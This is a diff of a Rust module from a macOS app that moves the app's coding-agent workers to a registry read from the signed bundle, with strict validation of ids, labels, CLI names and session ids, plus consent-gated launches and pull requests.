@@ -31,27 +31,55 @@
 //! ([`check_listener_on`], security review 2026-10-31): a free loopback port
 //! is anyone's to take, and the job's folder would go to whoever did.
 //!
-//! **Workers** run the person's own CLI (`claude`, `codex`) on their own
-//! account, with network access. Each needs the person's yes, per Mac, in the
-//! tray (Local Agents → Coding Agents; off by default), and a bundle that
-//! lists `"workers"`; and then a yes in a native confirm for each launch
-//! ([`super::starts`]). `local_agent_start { worker }` then runs F-web's adapter,
-//! `<node> <bundle>/workers/<worker>.mjs` (in a dev checkout, F-web's build of
-//! it: `<agentDir>/.output/workers/<worker>.mjs`), with `LOCAL_AGENT_WORKER` and
-//! `LOCAL_AGENT_WORKER_BIN` (the CLI as found on the login shell's PATH; Native Intelligence
-//! never installs it). The job keeps its worker, so a resume relaunches the
-//! same one. Everything else is eve's: the supervisor, stop and exit handling,
-//! the cap and parking.
+//! **Workers** run the person's own coding agent CLI on their own account,
+//! with network access. Which agents there are is data, not code: the
+//! entries of the bundle's `workers/registry.json` ([`Registry`]: an id, a
+//! label, the CLI's name), read only from the bundle on disk, never from the
+//! page or the network. Each needs the person's yes, per Mac, in the tray
+//! (Local Agents → Coding Agents; off by default), and a bundle that lists
+//! `"workers"` and carries the adapter, the registry and the agents' protocol
+//! adapters ([`WorkerFiles`]); and then a yes in a native confirm for each
+//! launch ([`super::starts`]). `local_agent_start { worker }` names a
+//! registry id; Rust then runs the one adapter for every worker,
+//! `<node> <bundle>/workers/acp.mjs` (in a dev checkout, the build of it:
+//! `<agentDir>/.output/workers/acp.mjs`), with `LOCAL_AGENT_WORKER` (the id),
+//! `LOCAL_AGENT_WORKER_BIN` (the CLI as found on the login shell's PATH,
+//! named as the entry's `cli`; Native Intelligence never installs it),
+//! `LOCAL_AGENT_ACP_DIR` (the bundle's `acp/`, where the agents' protocol
+//! adapters are installed) and `LOCAL_AGENT_FENCE_DIR` (the folder of the
+//! job's fence markers, made just before: [`super::fence`]). The job's folder (the adapter's cwd) is
+//! `<root>/jobs/<id>`; the adapter makes the agent's private home inside it,
+//! `<root>/jobs/<id>/home`, with links to the person's keychain folder and
+//! login, so the only removal of a job's folder here
+//! (a new job whose first launch failed) is `remove_dir_all`, which removes a
+//! link and never follows it. The job keeps its worker, so a resume
+//! relaunches the same one.
+//! Everything else is eve's: the supervisor, stop and exit handling, the cap
+//! and parking.
 //!
-//! A worker's session id reaches the person's CLI (`--resume`), so it is only
-//! ever a canonical lowercase UUID this Mac recorded from the adapter's own
-//! `session` line ([`check_worker_resume`]): Rust records no other, and a
-//! server-supplied id (`local_agent_start`'s `resume`) is refused unless it is
-//! that one. An id like `--settings=…` would otherwise become a flag.
+//! A worker's session id is whatever the agent answered, and it travels in
+//! JSON only, never on a command line. Still, it is only ever one this Mac
+//! recorded from the adapter's own `session` line, 1 to 256 of
+//! `[A-Za-z0-9._:-]` starting with a letter or digit ([`is_worker_session`],
+//! the adapter's own rule; [`check_worker_resume`]): Rust records no other,
+//! and a server-supplied id (`local_agent_start`'s `resume`) is refused unless
+//! it is that one.
 //!
 //! A worker's edit job works in a worktree like eve's, and Rust commits when
-//! it finishes. But a worker sends no prompts (the adapter has none), so it
-//! never asks to push or open a pull request: its branch stays on this Mac.
+//! it finishes, after checking again what the fence keeps out: a commit that
+//! would add or change an auto-run config, anything in a `.git` or an `.app`
+//! is refused whole ([`super::git::worker_commit_refuses`]).
+//!
+//! **A pull request** from a worker goes the way our own agent's does: its
+//! `finish { pull_request }` makes the adapter send the same `push` prompt
+//! line, Rust commits at once (after the sweep of its fence outside the
+//! adapter's tree, and the commit-time refusal above), asks the person
+//! natively, and on a yes pushes exactly that commit as the person and opens
+//! the pull request, through their `gh` or the server's route
+//! (`POST /api/local-agent/sessions/<jobId>/pull-request`) with the session
+//! token Rust holds for the job. The worker itself never gets that token, nor
+//! any Native Intelligence credential. Fence-widening prompts stay refused
+//! for workers ([`NO_WIDER_FENCE`]).
 //!
 //! **Fail closed.** A job never reaches the relay against the choice:
 //! - local model: the launcher gets the local server and no relay URL (its
@@ -131,56 +159,280 @@ const FOREIGN_SESSION: &str =
     "a coding agent's job resumes only on a session this Mac recorded for it; start a new job";
 const BAD_SESSION: &str = "this job's session isn't one a coding agent can resume; start a new job";
 /// Something changed between the handler's checks and the launch.
-const CHANGED: &str = "this Mac's model or coding agents changed while the job was starting; start it again";
+pub(super) const CHANGED: &str = "this Mac's model or coding agents changed while the job was starting; start it again";
+/// The bundle has no usable registry, adapter or agents' adapters
+/// ([`WorkerFiles::present`]), or doesn't list `"workers"`.
+const NO_WORKERS: &str = "this build of Native Intelligence can't run coding agents yet";
 
-/// A coding CLI a job can run on instead of eve.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
-pub enum Worker {
-    #[serde(rename = "claude-code")]
-    ClaudeCode,
-    #[serde(rename = "codex")]
-    Codex,
+/// The one adapter every worker runs, in the bundle's `workers/`.
+const ADAPTER: &str = "acp";
+/// The agents, as data, beside it.
+const REGISTRY_FILE: &str = "registry.json";
+/// Where the bundle has the agents' protocol adapters installed
+/// (`workers/install-agents.sh`; `LOCAL_AGENT_ACP_DIR`).
+const ACP_DIR: &str = "acp";
+/// Largest registry read, entries kept, and an entry's longest label and
+/// CLI name.
+const MAX_REGISTRY_BYTES: u64 = 64 * 1024;
+const MAX_WORKERS: usize = 32;
+const MAX_LABEL: usize = 40;
+const MAX_CLI: usize = 64;
+/// A worker session id's longest (the adapter's `SESSION_ID`).
+const MAX_WORKER_SESSION: usize = 256;
+
+/// A coding agent a job can run on instead of eve: one entry of the
+/// bundle's registry ([`Registry`]).
+#[derive(Debug, Clone, PartialEq, Eq, Hash)]
+pub struct Worker {
+    /// The registry key: what the page sends, `model.json` stores and the
+    /// adapter gets as `LOCAL_AGENT_WORKER` (`claude-code`).
+    pub id: String,
+    /// Its name in sentences, menus and confirms (`Claude Code`).
+    pub label: String,
+    /// The executable looked up on the login shell's PATH (`claude`).
+    pub cli: String,
 }
 
-impl Worker {
-    pub const ALL: [Worker; 2] = [Worker::ClaudeCode, Worker::Codex];
+/// The folder a remembered yes names for a grant at `grant_path`: its
+/// realpath now, only while that is the grant's path itself (grants are kept
+/// as realpaths, and compared as such: [`super::folder::canonical_dir`]).
+fn yes_folder(grant_path: &str) -> Option<String> {
+    let real = super::folder::canonical_dir(Path::new(grant_path)).ok()?;
+    (real.to_str() == Some(grant_path)).then(|| grant_path.to_string())
+}
 
-    pub fn parse(s: &str) -> Result<Worker, String> {
-        match s {
-            "claude-code" => Ok(Worker::ClaudeCode),
-            "codex" => Ok(Worker::Codex),
-            _ => Err("worker must be \"claude-code\" or \"codex\"".into()),
+/// A worker's tray item: what a yes means, plainly.
+fn allow_label(label: &str) -> String {
+    format!("Allow {label} (your own {label} account, with network access)")
+}
+
+/// A registry key, as the adapter's registry has it: a lowercase letter,
+/// then up to 31 lowercase letters, digits or `-`.
+pub fn is_worker_id(id: &str) -> bool {
+    let b = id.as_bytes();
+    !b.is_empty()
+        && b.len() <= 32
+        && b[0].is_ascii_lowercase()
+        && b.iter().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || *c == b'-')
+}
+
+/// `local_agent_start`'s `worker`, before the registry is read: its shape only.
+pub fn check_worker_id(id: &str) -> Result<(), String> {
+    if is_worker_id(id) {
+        Ok(())
+    } else {
+        Err("worker is not a coding agent's id".into())
+    }
+}
+
+/// A label shown in the tray and in a native confirm: plain ASCII words.
+fn is_label(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= MAX_LABEL
+        && s.trim() == s
+        && !s.contains("  ")
+        && s.bytes().all(|b| b.is_ascii_alphanumeric() || b" .+_-".contains(&b))
+}
+
+/// An executable's name, never a path or a flag.
+fn is_cli_name(s: &str) -> bool {
+    let b = s.as_bytes();
+    !b.is_empty()
+        && b.len() <= MAX_CLI
+        && b[0].is_ascii_alphanumeric()
+        && b.iter().all(|c| c.is_ascii_alphanumeric() || b"._-".contains(c))
+}
+
+/// The bundle's `workers/registry.json`: the coding agents it can run, by
+/// id. Only `label` and `cli` are Rust's; the rest of each entry (the
+/// adapter's command, its environment, its login) is the adapter's, which
+/// checks it again. Read from the signed bundle on disk only.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct Registry {
+    /// By id.
+    workers: Vec<Worker>,
+}
+
+impl Registry {
+    /// A malformed registry is a broken bundle: all of it is refused, and
+    /// with it every worker.
+    pub fn parse(bytes: &[u8]) -> Result<Registry, String> {
+        // A key twice (an agent, or a field of one) is a broken file, never
+        // "the last one wins".
+        serde_json::from_slice::<NoDuplicateKeys>(bytes)
+            .map_err(|e| format!("the coding agents' registry doesn't parse: {e}"))?;
+        let v: Value = serde_json::from_slice(bytes).map_err(|e| format!("the coding agents' registry doesn't parse: {e}"))?;
+        let entries = v.as_object().ok_or("the coding agents' registry isn't an object")?;
+        if entries.is_empty() || entries.len() > MAX_WORKERS {
+            return Err(format!("the coding agents' registry lists {} agents (1 to {MAX_WORKERS})", entries.len()));
+        }
+        let mut workers = Vec::with_capacity(entries.len());
+        for (id, entry) in entries {
+            let bad = |what: &str| format!("the coding agents' registry: {id:?} {what}");
+            if !is_worker_id(id) {
+                return Err(bad("isn't a worker id"));
+            }
+            let entry = entry.as_object().ok_or_else(|| bad("isn't an object"))?;
+            let field = |name: &str| entry.get(name).and_then(Value::as_str);
+            let label = field("label").filter(|l| is_label(l)).ok_or_else(|| bad("has no usable label"))?;
+            let cli = field("cli").filter(|c| is_cli_name(c)).ok_or_else(|| bad("has no usable cli"))?;
+            workers.push(Worker {
+                id: id.clone(),
+                label: label.to_string(),
+                cli: cli.to_string(),
+            });
+        }
+        workers.sort_by(|a, b| a.id.cmp(&b.id));
+        Ok(Registry { workers })
+    }
+
+    /// The registry at `path` (at most [`MAX_REGISTRY_BYTES`]).
+    pub fn load(path: &Path) -> Result<Registry, String> {
+        let meta = std::fs::metadata(path).map_err(|e| format!("{} can't be read: {e}", path.display()))?;
+        if !meta.is_file() || meta.len() > MAX_REGISTRY_BYTES {
+            return Err(format!("{} isn't a registry file", path.display()));
+        }
+        let bytes = std::fs::read(path).map_err(|e| format!("{} can't be read: {e}", path.display()))?;
+        Registry::parse(&bytes)
+    }
+
+    pub fn workers(&self) -> &[Worker] {
+        &self.workers
+    }
+
+    pub fn get(&self, id: &str) -> Option<&Worker> {
+        self.workers.iter().find(|w| w.id == id)
+    }
+
+    /// `id`, or the refusal of a worker this bundle doesn't know.
+    pub fn resolve(&self, id: &str) -> Result<&Worker, String> {
+        self.get(id).ok_or_else(|| {
+            let ids: Vec<String> = self.workers.iter().map(|w| format!("\"{}\"", w.id)).collect();
+            format!("worker must be one of {}", ids.join(", "))
+        })
+    }
+}
+
+/// Any JSON, refused if an object anywhere in it has a key twice.
+struct NoDuplicateKeys;
+
+impl<'de> Deserialize<'de> for NoDuplicateKeys {
+    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
+        struct Visit;
+        impl<'de> serde::de::Visitor<'de> for Visit {
+            type Value = NoDuplicateKeys;
+            fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
+                f.write_str("JSON")
+            }
+            fn visit_map<A: serde::de::MapAccess<'de>>(self, mut map: A) -> Result<NoDuplicateKeys, A::Error> {
+                let mut seen = std::collections::HashSet::new();
+                while let Some(key) = map.next_key::<String>()? {
+                    if !seen.insert(key.clone()) {
+                        return Err(serde::de::Error::custom(format!("{key:?} appears twice")));
+                    }
+                    map.next_value::<NoDuplicateKeys>()?;
+                }
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<NoDuplicateKeys, A::Error> {
+                while seq.next_element::<NoDuplicateKeys>()?.is_some() {}
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_bool<E>(self, _: bool) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_i64<E>(self, _: i64) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_u64<E>(self, _: u64) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_f64<E>(self, _: f64) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_str<E>(self, _: &str) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+            fn visit_unit<E>(self) -> Result<NoDuplicateKeys, E> {
+                Ok(NoDuplicateKeys)
+            }
+        }
+        d.deserialize_any(Visit)
+    }
+}
+
+/// Where a bundle keeps what its workers need: the app's bundle itself, or
+/// in a dev checkout its build, `<agentDir>/.output`
+/// (`scripts/local-agent/build.sh`), since the adapter can't run from source.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct WorkerFiles {
+    /// `workers/acp.mjs`: what `<node>` runs for every worker.
+    pub adapter: PathBuf,
+    /// `workers/registry.json`.
+    pub registry: PathBuf,
+    /// `acp/`: `LOCAL_AGENT_ACP_DIR`.
+    pub acp_dir: PathBuf,
+}
+
+impl WorkerFiles {
+    /// A launch's: a launcher run from TypeScript is a dev checkout's. Any
+    /// other launcher (the tests' stand-ins) names the adapter by its own
+    /// extension, beside it in the bundle's layout.
+    pub fn for_launch(launch: &LaunchConfig) -> WorkerFiles {
+        let agent = Path::new(&launch.agent_dir);
+        match launch.launcher.extension().and_then(|e| e.to_str()).unwrap_or("mjs") {
+            "ts" => WorkerFiles::under(&agent.join(".output"), "mjs"),
+            ext => WorkerFiles::under(agent, ext),
         }
     }
 
-    pub fn as_str(self) -> &'static str {
-        match self {
-            Worker::ClaudeCode => "claude-code",
-            Worker::Codex => "codex",
+    /// The watcher's, which has no launch: `from_source`, a dev checkout.
+    pub fn for_agent(agent_dir: &Path, from_source: bool) -> WorkerFiles {
+        if from_source {
+            WorkerFiles::under(&agent_dir.join(".output"), "mjs")
+        } else {
+            WorkerFiles::under(agent_dir, "mjs")
         }
     }
 
-    /// The person's command for it.
-    pub fn cli(self) -> &'static str {
-        match self {
-            Worker::ClaudeCode => "claude",
-            Worker::Codex => "codex",
+    fn under(root: &Path, ext: &str) -> WorkerFiles {
+        WorkerFiles {
+            adapter: root.join("workers").join(format!("{ADAPTER}.{ext}")),
+            registry: root.join("workers").join(REGISTRY_FILE),
+            acp_dir: root.join(ACP_DIR),
         }
     }
 
-    pub fn name(self) -> &'static str {
-        match self {
-            Worker::ClaudeCode => "Claude Code",
-            Worker::Codex => "Codex",
-        }
+    /// All of it is there: without any one, workers are off.
+    pub fn present(&self) -> bool {
+        self.adapter.is_file() && self.registry.is_file() && self.acp_dir.is_dir()
     }
 
-    /// Its tray item: what a yes means, plainly.
-    fn allow_label(self) -> &'static str {
-        match self {
-            Worker::ClaudeCode => "Allow Claude Code (your own Claude account, with network access)",
-            Worker::Codex => "Allow Codex (your own OpenAI account, with network access)",
+    /// The registry, when everything a worker needs is there and it parses.
+    /// A broken one is logged once per reason and counts as none.
+    pub fn registry_if_complete(&self) -> Option<Registry> {
+        // Off on every other system: nothing there yet holds a worker's whole
+        // process tree to its job (see `fence`'s notes on Windows).
+        if !cfg!(target_os = "macos") || !self.present() {
+            return None;
         }
+        match Registry::load(&self.registry) {
+            Ok(r) => Some(r),
+            Err(e) => {
+                note_registry(&e);
+                None
+            }
+        }
+    }
+}
+
+/// The app log says when the registry can't be used, once per reason.
+fn note_registry(why: &str) {
+    static LAST: std::sync::Mutex<String> = std::sync::Mutex::new(String::new());
+    let Ok(mut last) = LAST.lock() else { return };
+    if *last != why {
+        crate::log_to_file(&format!("[local-agent] coding agents are off: {why}"));
+        *last = why.to_string();
     }
 }
 
@@ -664,19 +916,6 @@ pub fn find_cli(path: &str, cli: &str) -> Option<PathBuf> {
         .find(|p| is_executable(p))
 }
 
-/// The worker's adapter: `<bundle>/workers/<worker>.mjs` in the app. A dev
-/// checkout runs its launcher from TypeScript, but an adapter can't run
-/// unbundled (its relative `.js` imports), so there it is F-web's build,
-/// `<agentDir>/.output/workers/<worker>.mjs` (`workers/build.sh`). Any
-/// other launcher (the tests' stand-ins) names its sibling by its extension.
-pub fn adapter_path(launch: &LaunchConfig, worker: Worker) -> PathBuf {
-    let agent = Path::new(&launch.agent_dir);
-    match launch.launcher.extension().and_then(|e| e.to_str()).unwrap_or("mjs") {
-        "ts" => agent.join(".output/workers").join(format!("{}.mjs", worker.as_str())),
-        ext => agent.join("workers").join(format!("{}.{ext}", worker.as_str())),
-    }
-}
-
 /// A start or resume names the model mode the server recorded for its session
 /// (`localModel`, from the claim). A job keeps that mode: if this Mac has
 /// switched since (a job parked on the relay, then a local model chosen), it
@@ -691,11 +930,15 @@ pub fn check_mode(recorded: Option<bool>, model: &ModelChoice) -> Result<(), Str
     }
 }
 
-/// A worker's session id: a canonical lowercase UUID (Claude Code's is one it
-/// chose at start, Codex's is its thread id). Nothing else is ever handed to
-/// the person's CLI, where it would follow `--resume`.
+/// A worker's session id, as the adapter accepts one from its agent: 1 to
+/// [`MAX_WORKER_SESSION`] of `[A-Za-z0-9._:-]`, starting with a letter or a
+/// digit (so never a flag). It travels in JSON only, never on a command line.
 pub fn is_worker_session(id: &str) -> bool {
-    uuid::Uuid::parse_str(id).is_ok_and(|u| u.hyphenated().to_string() == id)
+    let b = id.as_bytes();
+    !b.is_empty()
+        && b.len() <= MAX_WORKER_SESSION
+        && b[0].is_ascii_alphanumeric()
+        && b.iter().all(|c| c.is_ascii_alphanumeric() || b"._:-".contains(c))
 }
 
 /// A worker job resumes only on the session this Mac recorded for it, and
@@ -711,23 +954,58 @@ pub fn check_worker_resume(asked: Option<&str>, recorded: Option<&str>) -> Resul
     }
 }
 
-/// A start naming a worker for a job that already runs on another (or on eve).
-pub fn check_same_worker(recorded: Option<&str>, asked: Option<Worker>) -> Result<(), String> {
+/// A start naming a worker (by id) for a job that already runs on another
+/// (or on eve). `label` names a recorded worker, when it is known.
+pub fn check_same_worker(
+    recorded: Option<&str>,
+    asked: Option<&str>,
+    label: impl Fn(&str) -> Option<String>,
+) -> Result<(), String> {
     match asked {
-        Some(w) if recorded != Some(w.as_str()) => Err(match recorded.and_then(|r| Worker::parse(r).ok()) {
-            Some(r) => format!("this job runs on {}", r.name()),
+        Some(w) if recorded != Some(w) => Err(match recorded {
+            Some(r) => format!(
+                "this job runs on {}",
+                label(r).unwrap_or_else(|| "another coding agent".into())
+            ),
             None => "this job runs on Native Intelligence's agent".into(),
         }),
         _ => Ok(()),
     }
 }
 
-/// One launch's worker: its adapter and the person's CLI.
+/// The actor's check that the worker the handler looked up (`found`) is
+/// still the job's (`id`: the one it keeps, else the one the start names).
+/// Anything else changed in between: refused, never launched on a guess.
+pub fn same_worker(id: Option<&str>, found: Option<Worker>) -> Result<Option<Worker>, String> {
+    match (id, found) {
+        (None, None) => Ok(None),
+        (Some(id), Some(w)) if w.id == id => Ok(Some(w)),
+        _ => Err(CHANGED.into()),
+    }
+}
+
+/// One launch's worker: the bundle's adapter and agents' adapters, and the
+/// person's CLI.
 #[derive(Debug, Clone, PartialEq)]
 pub struct WorkerRun {
     pub worker: Worker,
     pub adapter: PathBuf,
+    /// [`WorkerFiles::acp_dir`], as `LOCAL_AGENT_ACP_DIR`.
+    pub acp_dir: String,
     pub bin: String,
+    /// The fence markers' folder, as `LOCAL_AGENT_FENCE_DIR`: filled in by
+    /// the actor at launch, once it has made the markers ([`super::fence`]).
+    pub fence_dir: String,
+    /// Our own listeners' loopback ports at launch, as
+    /// `LOCAL_AGENT_CLOSED_PORTS` (comma-separated, maybe empty), for the
+    /// fence to deny: filled in by the actor ([`super::Actor::closed_ports`]).
+    /// Ports opened later aren't in it; each listener's own secret is the
+    /// first line.
+    pub closed_ports: Vec<u16>,
+    /// The workspace tools list this launch got from the server, as
+    /// `LOCAL_AGENT_TOOLS_FILE` (board step 4, [`super::workspace_tools`]):
+    /// filled in by the actor at launch; none, no variable.
+    pub tools_file: Option<String>,
 }
 
 /// What a launch runs on beyond eve's defaults: the Mac's model choice and
@@ -754,14 +1032,23 @@ impl RunSpec {
     /// Make [`super::config::launcher_env`]'s list this run's, failing
     /// closed: a local model gets no relay URL and no dev key (the session
     /// token stays, for C1's tool routes, with the app's origin); a worker
-    /// gets none of the relay's variables.
+    /// gets none of the relay's variables, only its own five.
     pub fn apply(&self, env: &mut Vec<(String, String)>, launch: &LaunchConfig) {
+        let closed = self.worker.as_ref().map_or_else(String::new, |w| {
+            w.closed_ports.iter().map(u16::to_string).collect::<Vec<_>>().join(",")
+        });
         let mut add: Vec<(&str, &str)> = Vec::new();
         match (&self.worker, &self.model) {
             (Some(w), _) => {
                 env.retain(|(k, _)| ![RELAY_URL, RELAY_TOKEN, DEV_KEY].contains(&k.as_str()));
-                add.push(("LOCAL_AGENT_WORKER", w.worker.as_str()));
+                add.push(("LOCAL_AGENT_WORKER", &w.worker.id));
                 add.push(("LOCAL_AGENT_WORKER_BIN", &w.bin));
+                add.push(("LOCAL_AGENT_ACP_DIR", &w.acp_dir));
+                add.push(("LOCAL_AGENT_FENCE_DIR", &w.fence_dir));
+                add.push(("LOCAL_AGENT_CLOSED_PORTS", closed.as_str()));
+                if let Some(file) = &w.tools_file {
+                    add.push(("LOCAL_AGENT_TOOLS_FILE", file));
+                }
             }
             (None, ModelChoice::Local { server, model }) => {
                 env.retain(|(k, _)| ![RELAY_URL, DEV_KEY].contains(&k.as_str()));
@@ -782,7 +1069,7 @@ impl RunSpec {
     /// For the app log's "run" line.
     pub fn describe(&self, has_token: bool) -> String {
         match (&self.worker, &self.model) {
-            (Some(w), _) => format!("{} at {}", w.worker.name(), w.bin),
+            (Some(w), _) => format!("{} at {}", w.worker.label, w.bin),
             (None, ModelChoice::Local { .. }) => format!("local model {}", self.model.label()),
             (None, ModelChoice::Relay) if has_token => "model relay".into(),
             (None, ModelChoice::Relay) => "dev model key".into(),
@@ -799,6 +1086,28 @@ struct Stored {
     model: Option<Value>,
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     allowed_workers: Vec<String>,
+    /// The folders the person said yes to, per worker
+    /// (`{"worker": "<id>", "folder": "<realpath>"}`; [`remembered_yes`]).
+    /// Raw JSON: an entry of another shape is kept as it is and grants
+    /// nothing.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    worker_folders: Vec<Value>,
+}
+
+/// A well-formed remembered yes: (worker id, folder realpath). Anything else
+/// in `workerFolders` (a hand edit, a newer build's entry) is none.
+fn remembered_yes(entry: &Value) -> Option<(&str, &str)> {
+    let worker = entry.get("worker")?.as_str()?;
+    let folder = entry.get("folder")?.as_str()?;
+    let path = Path::new(folder);
+    // Absolute, and exactly as written: no `.`, `..`, doubled or trailing `/`.
+    let plain = path.is_absolute()
+        && !folder.contains('\0')
+        && path
+            .components()
+            .all(|c| matches!(c, std::path::Component::RootDir | std::path::Component::Normal(_)))
+        && path.components().collect::<PathBuf>().as_os_str() == path.as_os_str();
+    (is_worker_id(worker) && plain).then_some((worker, folder))
 }
 
 impl Stored {
@@ -823,6 +1132,7 @@ impl Stored {
         Stored {
             model: Some(Value::String("unreadable".into())),
             allowed_workers: Vec::new(),
+            worker_folders: Vec::new(),
         }
     }
 
@@ -846,19 +1156,47 @@ impl Stored {
         std::fs::rename(&tmp, path)
     }
 
-    fn allowed(&self, worker: Worker) -> bool {
-        self.allowed_workers.iter().any(|w| w == worker.as_str())
+    fn allowed(&self, id: &str) -> bool {
+        self.allowed_workers.iter().any(|w| w == id)
+    }
+
+    /// The person said yes to `worker` in `folder` (a realpath), exactly.
+    fn remembers(&self, worker: &str, folder: &str) -> bool {
+        self.worker_folders
+            .iter()
+            .filter_map(remembered_yes)
+            .any(|(w, f)| w == worker && f == folder)
     }
 }
 
 /// What the watcher found: the bundle's capabilities, the servers (when the
-/// bundle runs local models) and the CLIs on the login shell's PATH (when it
-/// runs workers).
+/// bundle runs local models), its coding agents' registry (when the bundle
+/// has everything a worker needs) and the ids of those whose CLI is on the
+/// login shell's PATH (when it runs workers).
 #[derive(Debug, Clone, Default, PartialEq)]
 pub struct Found {
     pub caps: Caps,
     pub servers: Option<Vec<Detected>>,
-    pub clis: Vec<Worker>,
+    pub registry: Option<Registry>,
+    pub clis: Vec<String>,
+}
+
+/// One line of the Coding Agents menu: a registry entry, or an id the
+/// person allowed that this bundle's registry doesn't list (`label` none),
+/// kept so the yes can be taken back.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct WorkerItem {
+    pub id: String,
+    pub label: Option<String>,
+    pub allowed: bool,
+}
+
+/// A coding agent a start may name right now (`local_agent_status`'s
+/// `workers`): in the bundle's registry, allowed on this Mac, its CLI found.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub struct WorkerOffer {
+    pub id: String,
+    pub label: String,
 }
 
 /// The actor's L4 state ([`Actor`]'s `l4`).
@@ -915,17 +1253,55 @@ impl L4 {
                 })
                 .collect()
         });
-        let workers = Worker::ALL
-            .into_iter()
-            .filter(|w| self.stored.allowed(*w) || (self.found.caps.workers && self.found.clis.contains(w)))
-            .map(|w| (w, self.stored.allowed(w)))
+        // A registry entry installed on this Mac (and run by the bundle), or
+        // one already allowed; then any other id allowed (the way back).
+        let registry = self.found.registry.as_ref().map(Registry::workers).unwrap_or_default();
+        let mut workers: Vec<WorkerItem> = registry
+            .iter()
+            .filter(|w| self.stored.allowed(&w.id) || (self.found.caps.workers && self.found.clis.contains(&w.id)))
+            .map(|w| WorkerItem {
+                id: w.id.clone(),
+                label: Some(w.label.clone()),
+                allowed: self.stored.allowed(&w.id),
+            })
             .collect();
+        for id in &self.stored.allowed_workers {
+            if is_worker_id(id) && !workers.iter().any(|w| &w.id == id) {
+                workers.push(WorkerItem {
+                    id: id.clone(),
+                    label: None,
+                    allowed: true,
+                });
+            }
+        }
         self.view = L4View {
             choice,
             servers,
             local_model: self.found.caps.local_model,
             workers,
         };
+    }
+
+    /// What a start may name right now, as far as Rust last looked: a
+    /// bundle that runs workers, the relay chosen (a local model refuses
+    /// them), and of its registry the agents allowed and installed. A start
+    /// still checks it all again.
+    fn offered(&self) -> Vec<WorkerOffer> {
+        if !self.found.caps.workers || !self.choice().is_ok_and(|c| c.is_relay()) {
+            return Vec::new();
+        }
+        self.found
+            .registry
+            .as_ref()
+            .map(Registry::workers)
+            .unwrap_or_default()
+            .iter()
+            .filter(|w| self.stored.allowed(&w.id) && self.found.clis.contains(&w.id))
+            .map(|w| WorkerOffer {
+                id: w.id.clone(),
+                label: w.label.clone(),
+            })
+            .collect()
     }
 }
 
@@ -940,7 +1316,7 @@ pub struct L4View {
     /// The bundle runs local models.
     pub local_model: bool,
     /// The workers the tray offers, and whether each is allowed.
-    pub workers: Vec<(Worker, bool)>,
+    pub workers: Vec<WorkerItem>,
 }
 
 impl Default for L4View {
@@ -957,7 +1333,7 @@ impl Default for L4View {
 /// One line of an L4 submenu.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum MenuLine {
-    /// A check item; `id` is [`ModelChoice::menu_id`] or [`Worker::as_str`].
+    /// A check item; `id` is [`ModelChoice::menu_id`] or [`Worker::id`].
     Choice { id: String, label: String, checked: bool },
     /// Disabled text.
     Note(String),
@@ -1066,12 +1442,20 @@ impl L4View {
     pub fn workers_menu(&self) -> Vec<MenuLine> {
         self.workers
             .iter()
-            .map(|(w, allowed)| MenuLine::Choice {
-                id: w.as_str().into(),
-                label: w.allow_label().into(),
-                checked: *allowed,
+            .map(|w| MenuLine::Choice {
+                id: w.id.clone(),
+                label: match &w.label {
+                    Some(label) => allow_label(label),
+                    None => format!("Allow {} (not in this build)", w.id),
+                },
+                checked: w.allowed,
             })
             .collect()
+    }
+
+    /// Whether the tray shows `id` as allowed.
+    pub fn worker_allowed(&self, id: &str) -> bool {
+        self.workers.iter().any(|w| w.id == id && w.allowed)
     }
 }
 
@@ -1086,7 +1470,8 @@ pub(super) struct Precheck {
     recorded: Option<String>,
     /// The job's session as this Mac recorded it.
     session: Option<String>,
-    allowed: Vec<Worker>,
+    /// The ids the person allowed.
+    allowed: Vec<String>,
     detect: Detector,
 }
 
@@ -1105,14 +1490,21 @@ pub(super) enum Cmd {
         choice: ModelChoice,
         reply: Reply<()>,
     },
-    /// The tray's Coding Agents menu.
+    /// The tray's Coding Agents menu, by id.
     Allow {
-        worker: Worker,
+        worker: String,
         allowed: bool,
         reply: Reply<()>,
     },
+    /// What a start may name, for `local_agent_status`.
+    Offered {
+        reply: oneshot::Sender<Vec<WorkerOffer>>,
+    },
     /// The watcher looked.
     Found(Found),
+    /// The watcher read the bundle's registry, before its first look (the
+    /// tray names the allowed workers by it).
+    Registry(Option<Registry>),
     /// A start looked at the servers.
     Servers(Vec<Detected>),
     /// [`watch`]: look now? A folder is shared and local agents are on.
@@ -1144,7 +1536,16 @@ impl Actor {
                 let _ = reply.send(self.set_model(choice));
             }
             Cmd::Allow { worker, allowed, reply } => {
-                let _ = reply.send(self.allow_worker(worker, allowed));
+                let _ = reply.send(self.allow_worker(&worker, allowed));
+            }
+            Cmd::Offered { reply } => {
+                let _ = reply.send(self.l4.offered());
+            }
+            Cmd::Registry(registry) => {
+                if !self.l4.looked {
+                    self.l4.found.registry = registry;
+                    self.l4.refresh_view();
+                }
             }
             Cmd::Found(found) => {
                 self.log_servers(found.servers.as_deref());
@@ -1176,7 +1577,7 @@ impl Actor {
                     exists: job.is_some(),
                     recorded: job.and_then(|j| j.worker.clone()),
                     session: job.and_then(|j| j.session_id.clone()),
-                    allowed: Worker::ALL.into_iter().filter(|w| self.l4.stored.allowed(*w)).collect(),
+                    allowed: self.l4.stored.allowed_workers.clone(),
